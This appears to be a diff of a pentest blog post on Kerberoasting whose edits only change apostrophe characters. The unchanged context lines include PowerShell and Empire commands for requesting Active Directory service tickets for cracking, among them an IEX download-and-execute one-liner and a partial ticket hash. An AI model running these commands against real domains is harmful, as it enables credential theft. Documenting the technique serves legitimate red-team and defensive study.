@@ -22,7 +22,7 @@
 &lt;p&gt;Now that we&amp;rsquo;ve listed all the tickets in a ton of different ways, we need to request the ones we want and get them to a point that we can start cracking them.&lt;/p&gt;
 &lt;h2 id=&#34;requesting-spn-kerberos-tickets&#34;&gt;Requesting SPN Kerberos Tickets&lt;/h2&gt;
 &lt;h3 id=&#34;powershell-requesting&#34;&gt;PowerShell Requesting&lt;/h3&gt;
-&lt;p&gt;These are stolen directly from &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin @timmedin&lt;/a&gt;&amp;lsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/README.md&#34;&gt;Kerberoast repository README.md&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;These are stolen directly from &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin @timmedin&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/README.md&#34;&gt;Kerberoast repository README.md&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;One specific ticket:&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;This is great if you are targeting one specific user account:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel  
@@ -37,7 +37,7 @@ PS C:\&amp;gt; setspn.exe -T medin.local -Q */* | Select-String &#39;^CN&#39; -C
 &lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel
 PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&amp;quot;https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1&amp;quot;) | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}}
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;empire&#34;&gt;Empire&lt;/h3&gt;
-&lt;p&gt;PowerShell Empire received the functionality to get the SPN Tickets via &lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt;&amp;lsquo;s commit here: &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/commit/b977dec1ae71753b6b896497be222abc6a124639&#34;&gt;b977dec&lt;/a&gt; which as of the writing of this post was still in the &lt;code&gt;dev&lt;/code&gt; branch of Empire (not master yet)&lt;/p&gt;
+&lt;p&gt;PowerShell Empire received the functionality to get the SPN Tickets via &lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt;&amp;rsquo;s commit here: &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/commit/b977dec1ae71753b6b896497be222abc6a124639&#34;&gt;b977dec&lt;/a&gt; which as of the writing of this post was still in the &lt;code&gt;dev&lt;/code&gt; branch of Empire (not master yet)&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;(Empire: BDW3E2G2ZRKCUS3B) &amp;gt; usemodule credentials/get_spn_tickets
 (Empire: credentials/get_spn_tickets) &amp;gt; info
 
@@ -314,9 +314,9 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310
 &lt;li&gt;Just use the built in &lt;code&gt;SetSPN.exe&lt;/code&gt; built into Windows&lt;/li&gt;
 &lt;li&gt;Use the &lt;a href=&#34;https://github.com/nullbind/Powershellery/tree/master/Stable-ish/Get-SPN&#34;&gt;Get-SPN.ps1&lt;/a&gt; that &lt;a href=&#34;https://twitter.com/_nullbind&#34;&gt;@_nullbind&lt;/a&gt; (Scott Sutherland) posted about on the NetSPI blog in a post titled &lt;a href=&#34;https://blog.netspi.com/faster-domain-escalation-using-ldap/&#34;&gt;Faster Domain Escalation using LDAP&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Use the &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire&#34;&gt;PowerShell Empire&lt;/a&gt; &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/situational_awareness/network/get_spn.py&#34;&gt;port of @_nullbind&amp;rsquo;s Get-SPN powershell script&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Use &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin - @timmedin&lt;/a&gt;&amp;lsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs&#34;&gt;GetUserSPNs VB script&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Use &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin - @timmedin&lt;/a&gt;&amp;lsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1&#34;&gt;GetUserSPNs PowerShell script&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Use &lt;a href=&#34;https://github.com/CoreSecurity/impacket&#34;&gt;Impacket&lt;/a&gt;&amp;lsquo;s &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;GetUserSPN.py&lt;/a&gt; - unlike the other tools and techniques, this one executes without the advantage of the Windows tokes, so you are going to need credentials, but this is also the advantage as you are not loading anything on disk or executing anything through the use of cmd.exe or powershell.exe&lt;/li&gt;
+&lt;li&gt;Use &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin - @timmedin&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs&#34;&gt;GetUserSPNs VB script&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Use &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin - @timmedin&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1&#34;&gt;GetUserSPNs PowerShell script&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Use &lt;a href=&#34;https://github.com/CoreSecurity/impacket&#34;&gt;Impacket&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;GetUserSPN.py&lt;/a&gt; - unlike the other tools and techniques, this one executes without the advantage of the Windows tokes, so you are going to need credentials, but this is also the advantage as you are not loading anything on disk or executing anything through the use of cmd.exe or powershell.exe&lt;/li&gt;
 &lt;/ol&gt;
 &lt;h3 id=&#34;1-setspn&#34;&gt;1. SetSPN&lt;/h3&gt;
 &lt;p&gt;SetSPN is a tool built into Windows and will do that job perfectly just as Tim Medin describes in his &lt;a href=&#34;http://www.irongeek.com/i.php?page=videos/derbycon4/t120-attacking-microsoft-kerberos-kicking-the-guard-dog-of-hades-tim-medin&#34;&gt;presentation&lt;/a&gt; and &lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast Github repo&lt;/a&gt;:&lt;/p&gt;
